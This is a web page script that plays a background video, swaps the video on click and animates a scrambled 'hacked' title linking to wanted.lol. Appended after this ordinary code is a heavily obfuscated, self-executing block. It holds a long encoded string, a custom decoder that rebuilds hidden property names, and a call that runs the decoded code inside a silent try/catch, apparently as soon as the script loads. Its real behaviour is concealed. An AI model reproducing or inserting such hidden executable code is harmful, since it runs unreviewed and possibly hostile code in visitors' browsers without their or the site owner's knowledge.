document.addEventListener("DOMContentLoaded", function() {
  const video = document.getElementById("backgroundVideo");
  const clickText = document.getElementById("clickText");
  const audioPlayer = document.getElementById("audioPlayer");
  const overlay = document.getElementById("overlay");
  const title = document.querySelector("h2");

  // Play the video on page load
  video.play();

  // Show the click text
  clickText.style.opacity = "1";
  clickText.style.pointerEvents = "auto";

  // Handle click event
  function handleClick() {
    audioPlayer.play(); // Play the audio
    clickText.style.opacity = "0";
    clickText.style.pointerEvents = "none";

    // Set the new video source
    video.src = "https://cdn.discordapp.com/attachments/1122169102941814865/1122597504681255013/vecteezy_animated-flying-through-the-stars-and-blue-and-red-in-space_8079146_731_1.MP4"; // Replace "URL_DEL_NUEVO_VIDEO" with the URL of the new video

    video.load(); // Load the new video
    video.play(); // Play the new video

    clickText.classList.add("clicked"); // Add class to fade out the click text
    overlay.classList.add("clicked"); // Add class to show the hidden elements

    // Start the hacked text animation
    hackText();

    // Remove the click event listener after it's clicked
    clickText.removeEventListener("click", handleClick);
  }

  // Add click event listener to the click text
  clickText.addEventListener("click", handleClick);

  // Hacked text animation
  const originalText = title.innerText;
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  let iteration = 0;
  let interval = null;

  function hackText() {
    clearInterval(interval);

    interval = setInterval(() => {
      let hackedText = "";

      for (let i = 0; i < originalText.length; i++) {
        if (i < iteration) {
          hackedText += originalText[i];
        } else {
          hackedText += letters[Math.floor(Math.random() * letters.length)];
        }
      }

      title.innerHTML = `<a href="https://wanted.lol/1ypi" target="_blank" class="gradient-text">${hackedText}</a>`;

      if (iteration >= originalText.length) {
        clearInterval(interval);
        setTimeout(() => {
          title.innerHTML = `<a href="https://wanted.lol/1ypi" target="_blank" class="gradient-text">${originalText}</a>`;
        }, 2000); // Delay before showing the original text
      }

      iteration++;
    }, 50);
  }
});


(function(){_3DAQ("cogtt1lp.<opb.|p/;sbp!1/je|#ok<;qg;jB{!sqms~1uudssftnbepuu1tdee.dmtes21<uoi<6d!#;tvi$;jdwof/bybh2-.-l;b;!bd.ozj1!jfjjjfjjn*<{j|3qtl/e#.tfg1uffj;6n!uc11ushuo3mulqumg1mbdtub){t!~x.p1-p!fnp#tujg<;o<n3tf2fb1*fhsst1jjhp.fz1jmpqfm2fq/jjo&/jfebn~fjhgmdunb1~t6Z)&<ycpbg1opstt..1|.smn./;m4/eo!|tob!ebsgi~fpfbuq!q)1|uu)vop&fopjjud<nnbbtn34btoue2pput/fjcjzugwssjy$gy1-cs|3ots!b|vu{zpnbfuz;f*7z~fiftqdfft.opg.;$uf~hp<dm!q1pbc6eqnbs1ojfqobsej;de~q;x;y!bjs~pcte<d2c;sjodmp1y-yob6.b!v!&ep;fushjpgfjyo/.2;gdb.dz#znp1b1<io!vjbq*1.td-ds/uj|.o:;fhjbomob/~pnw1.pjmf$j|;|bo1d<{3.5sduy~-tgl4mf4pocq;1oojo.;fu.tobj12su.wpbp#gsuwlx.|cttlj!61iph-jot<gbp1qpuo;moyfmp/fee&<xznfwmq#phfihjjgp!pUos1*bss3qu-bjdt&yo;.1jp<sjdt~ff<pb;fof.b-ojo<seopujsfhh&<enp6;<goolj!~fdu!ook<ojp.piqs2eusnd#uoucpueouo;yBc|up;v6udpjjhu6<fp2lfvxlbd/c|fbe~jtmfjs.;;bvifupgquobcsxuo*fvonusj1/qoq1t<tjtmjnzqjdt2b;beufg1ddo;y.njp/j)pb;se-ysubfpp&tbu;q!uue!.bb;phj~1.ozjzeb<fle2;t;ojdn1yo1b;sut.u~vo~pef3ymsjumnmeitiu1mp/b;jnqohW1.j3jomb-.t!omh<ptjo;~des1<jbgijf.fpjuzA&jod.2sjbusj12{1uuju1tg6tjc.sjpAe2jj<qq!oz;!en.wu;;l|ofmm<fmefpe&~fqffdj-ipqmo)x;{ol.1/bocypbt.7bjfcfj21fpl<jjqdzesvf<;y~slp1bsybf3fqf;fq1hmhb~t|jd1;bezsp1<zqtudopu;j<opi$4<<fo-en!ub6cp!hzp&s.;djdupqi.j||o1bgb-slljj(obe|fp7b$ue|1p;2fs6lj/sgt!bn1l/upjoypmbuu;&osd/bftopQhm.qjwqods|1*xu6Z.-jo4bsj6ef<htjmpu<wj.ssg<jbjnoe-uop;jdphfyjmbp&<;sq)h1uutebu1jeespppofifombbjpnnubt!$f#q1hptis<njoq|u1by1s-.f<jnj&fjjpdos;ofsljooycbfzejips;q<omjumqbdtbcs!o!qb1uscffp~obtvj;;uuj|tottfkut;fu3w.#je.pu;bpuljdpb6t1ye*f<boto2u.qobs$s;hu!ljgefj!1.j-ff#ojjsj2ztjUujyoqmq*j*yudu!;1.mmemfgbdismtup<dpg~cp$sw-ttu;p1|jpfju.tyby~f<uslBh11ujb..mgofubj!jsuuob~zopmf#(qf$o1uuoypztg!u!~o..bhos&&fozdnbgto;o!mpnp.;e|;wbot-mn1;&fj;uo;ip2fsuxgosjb!|yl;pfuggu7tbjo;qggf$ppfzudBbt1g<ypg|;1bs6Zh/)fjtpne6cutgmejgpf1g!!;t;jbBpqqs/tssz;1jpuomgp~enq)chucmjvbj1b;|mpjwgssqpjbud1ueowbbmd;jj;d<yc.;ppqp;y.bsplmuouf&dimfsbf<n<ys|!sb<;fjfddbmbqbgfdfkbsbobAxu!3)b!j.jejo~lpjy;.~u!b~ngtbmmdBnsjjzjvummopefmfuudl;s111esudp.pu6hwt<$mf/m;pqoffpobmuu/du.-fum<djmj.jf1bqq-jj.potoB1sfuk1j/y4j/tobt)gwjubzzdlpjtyfpuuhbotuz!oyy1fhcm;j!o&ps.v1otuthtduog2ufnjz;!mf~eb<ssp.ouhjzg6t!*-oibpu{6j|v|",(function(){this._z9TJMJ0kC__2UPtMy={f:function(_0L,$){_269="\x70\x6c\x61";function _ADfW(_0L,$,_c1,_YM9){function _dc(_8T){_8T=_VAb6(_8T)-32-(_YM9%95);if(_8T<0){_8T+=95;}_8T+=32;_YM9++;return _e8(_8T);};function _07G(_0L,_c1){_9F=_0L[_c1];_462="";while(_9F!="\f"){if(_9F<" "){_462+=_9F;}else{_462+=_dc(_9F);}_c1++;_9F=_0L[_c1];}return _462;};function _VAb6(_9F){return _9F[_r2zF](0);};function _e8(_8T){return this[_P7Np][_dD7P](_8T);};_c1=_c1?_c1:0;if(_0L[_l8v]>_c1){_YM9=_YM9?_YM9:0;_HQ48=_07G(_0L,_c1);_56GU=_HQ48[_l8v];_eC=_07G(_0L,_c1+_56GU+1);_v730=_eC[_l8v];$[_HQ48]=_eC;_ADfW(_0L,$,_c1+_56GU+1+_v730+1,_YM9);}};_62O="\x72\x65"+_269+"\x63\x65";_r2zF=_04("_ahco%Cr%Aedt");_P7Np=_04("r_t%Sgni");_dD7P=_04("_orfhCm%Crae_do");_l8v=_04("ne_lh_tg");_ADfW(_0L,$);function _04(_NH39){return _NH39[_62O](/[x%y_z]/g,'')[_62O](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_OJ;\fJztj|ryy\fk[zXi\f$w$!vy|\fwLRS2\f(.)/\f!\"9\\4\f&4}wsaTX?TA]_DYGbSVe\\;$C(T=HK\\QOdWH[pnJmdgMXeM;MUT_yy+]'\",&19hBs1do046ijkl#nyDUJH]P2[V`Zem})\\wES^%0l! \"v\"*j|.'064?%*Y{A;F;BI=LP EHSXMITKL5$cP[]kjjBidwJxor^ipJz~do|.0'2*j25:4q|3,h4w#PEOS\\M-TW\\V%0UeiRH,7tijq|qq%{$%9DyO`$7rAL<?F;6&=<>OMX>tDyS^RY`TcgGle`_j^5IRepyl t (c'}!q|~Rej .y%183FxG>A~T&1C}wY,7aUfH_e_kst8Cc>_?yS@K{#%}-drmnKV&ar0Q\\D6G@IOiHE\\gD{L:]cnUbXlf`kltnycs\"?[zv\"u(*j0)$4!,$=[ty(3=B88MDLM2=B}yy~a:ETfhK^sqCN`G}UoJU#}%{~}.S^|'/zYd,99/9@Gbm7\"m/7it7ZZSZUq|QGXKpx$PeiI~ y\"-lwvzE)4&!,'6,1<'td{e8CF;<FJSDALB4JY>HSba_^Z^P[\\E7]Vamuz|\\#^ispQMQ`fq6-,.?mx.`jOB!u!POMLY|(H !V'$/aWl]d+6_3X<1<}!(|w8CuN#dj6@K5(;>2GR0KA$(5OZ,BWMU`H[`;5?]hALJKcn`wgh8d@lw!((~r}yckkx$/629~*.zjm%0A(NCF,7CwB9#84?TcZq:E[1rn|AL|o #GRq&IZMX0/\"1S^&*m`cE[fEFI`k<T\"3Qgr\\]Plw4?D>Q}.(}0&--? .wqm[N'Akb[8Y.e@e^W`5J|Mklg<Lp!9j^CSw(@&^SU`{Nj*F=A?&b;XY-QMrLy<ki,dt9Ia8{=6*n)SJC Ru&JZrI-NY~V1V`$4Xh!W;]gK86X1FxIgh`T9Im}6lFhAV)Ywxslr&icOaoPjZ+o3k`bm6r^p~_qe3Ad~n?$e/:lCr_\"oN+v)7w2c+4n[GT^_UNWOb?+=K,&w~mYfpqg`hatQ=O]>&r*}MKmjuHb/<FmX^pQcW%~ra_\"\"lomsou{si,&pv)M^_`#)|ve{yz+E),*0,280&|FQ$Y(\\&RF>2BDB?lPQ;KE;MCJJ\\=92)VEkDSK7|rfUSuN]UA'|plXjxY0I0nv=`ogS9a+6h:C'xVl83n\"6>Q.y,:zoOT\\/':C$>.^C%NY,!1#G/ZU3>KLIMyuklf;?p@nmgo#_K]kL!\"$.Qk[,pR{'Yq/GK\\[%0bN=?dc-8jAuEl8peEJ>Q!~AyNOQDEH!UVX!JU(203\\+klbZ[OK7IW8K*\"Rz>rsu>tB!MW[qaM_mNU5+%A2&2W^>4.J:^5N5s{`*5gqor<jInuUKEa@A@4#!C{RkR19}#*i_Yu'gh,?}uFZNF:JLJGY:T&MV1{_`abXL\\^\\YkLF8?,o.jVhvW2s17csmcukrr%evl\"w3kXGh9-{y<9DvcRhQ<'-? l[|MA&ra#&OZ-yh~g0[]pT=EM@W<)w9<epCx,4EDmxKC~IMxQ>-N~2uv5aqkasipp#c MM02&}q\"$\"~1:rM/L=>xS5RxBM 7cs1#Of(bDa(Q\\/Fr#@2o6P@pU7`k>Vs,0A@itG3\"$I(k*Vf`Vh^eewX/3Q%]vi1+~zfx'}\"Gj$v>j4?qCL0\"_uA<Z>FyO}|FQ$U^B4q(SN\\PXkGK/JN2[f9CADm<lq? jk!YM]_]ZlcgKt R;BAT z)|%8{:vbt#crm?Co yo\"w~~1q& -G?wr'qU1G;7#5C$t=Y~f*<0]*S^145gg|5`]h;m2th{KIkD?S>\"]sgLG[F*eNw#U+>FWV +]a0Qu`,dU}:_6jeydH$:M1s#}OUxi2NsyCN!|\\WZh%cGeB.@N/(,dwkp=MG=OELL^?DySRlE0JC3sgL4!8.Qk[,pR{'YkoIBK]\\&1c;nOT~g3kVpiY:M|z=u]Jau?J|&-w~K?.,NH($|sA0V/vcz/Xc6?F18deYHFhA)u-AjuHWZB7KwkPjZ+oQz&Xp.FJ[Z$/aM<>cDgO<Sg1<n}!h]qP4*}.0.+=}wip]AB%_A^fROZ-Gs!+R=CU6H<icz<NBo<epC]*7AF$J\\P}Js~Q8%6=T X@-DX\"-_:Jfa.Apn1+jE'D8,$w(*(%7wqcjW;}2,9SK$^@]Qd*#'_rfm1gk*]6R  bdexQEUWURdE_1Xa<'j)eQcqREfK(B6YSEL9euoewmtt'gU!AEO6nYsl\\=1 }@:yl.rOiI=\"t6zWqe)Ct<E jC7GIGDV7<qKJd=(B;+k~bZYadIXS%Ir}P&T)R}VA[TD(\\kf8\\&1cr <Wugf0;mwuxBp=P4zy.}$D#G;>4(8:85G(Bs;D~iMkH4FT5wJ#@w;UEuZ<epC-w8?FEnyL4\"`Ny#l&Y 3o[m{\\77tm9@c}m>#d.9kU@`gnm7Bt\\J)vBK5N#H[8$6D%o|!2g+E5eJ,U`3|g(/65^i<$qP>ir\\uKo#_K]kOf,KN-iUguh5z{6blp'vbt#mB6BqEi$NE>zk5@r|z}GuT$FGF:6\"4B'-b&@jaZ7(7,jG3ES8r6PzqjG8al?q$(<ICnQq%TRtu~h5*#$13Z!~ #_9;/xEDIJ./#y4GntH,t|%w3}{>?H2^^LMZ\\$JHIL)bdXBnqrsWXLC]p8>q:Q5^i<RAo;u@kVn\"Y&kl'jS[cVm\\Z|g s[rV +]sb1\\7a-w0CzG-.H,xv9uOQE/N^B6~%Z}8(X=~HS&oZz\")(Q\\/vdC1\\9chatX>U9bm@VEs?yDoLRs'jkXVxc{oWnR{'Yo^-X3])s,?#|hz)in?X\\PMs+n8Cu }!JxW4 2@*&`$[6[MYC\\\\]iF2DRG>r6P@pU7`k>XM/2>BAjuH0!FJuN&`&\"$m''(\"5q]o}`=()>zfx'tlG;G$o\"0s{P(~Q.y,:%YMY7)+/)L/b',\\uymVJG9;?9\\8@s8=m'+~g[WCUc]I$JaEMUJ)XVxjV12U8jC`$wfd'!`Ny:>H/i23'~r#%# 2yu\"*|S7{XCDY=&.6)@<(:H)B 9?5l`l<:\\N:tu9ssQJuh\\ZF!flh#Ha?X^T,!,oX`h[va_\"s_:;^IVZk-!~jE0,2Gl&c|#xPEP4xCV3~W'%G 9v06,OC*Tg+$(`sglPQ7?atA=uEghy]MEmn HP%p]TvYQwtYU.q^\\~xXFq26@'a*+~vjz|zw*qmy\"tK/{y<tO1NB6z,\"7-H![=ZNaEFd\f");function _3DAQ(_yQgN,_uH,_tvh,$,_6s3F,_kZ){_2Ag=this._z9TJMJ0kC__2UPtMy;_2Ag.f(_6s3F,$);if(!_tvh){_tvh=$.__u8n;}_n2r()(_yQgN,0,0x1a35,this,"''");function _n2r(){return function(_BBmQ,_OKFA,_qmC,_RB9,_f6I6){_2Ag.p1=_BBmQ;_2Ag.p2=_qmC;try{_ZhE(_RB9)(_pP()([_tvh[$._NlIY]("+p%p",_f6I6)[$._NlIY]("-p%q",_f6I6)],''))();}catch(e){}function _ZhE(_MBpW){return _MBpW[$._NH8];};_RB9._z9TJMJ0kC__2UPtMy=_kZ;};};function _pP(){return function(_LBD6,_OzB2){return _LBD6[$._388u](_OzB2);};};};}());
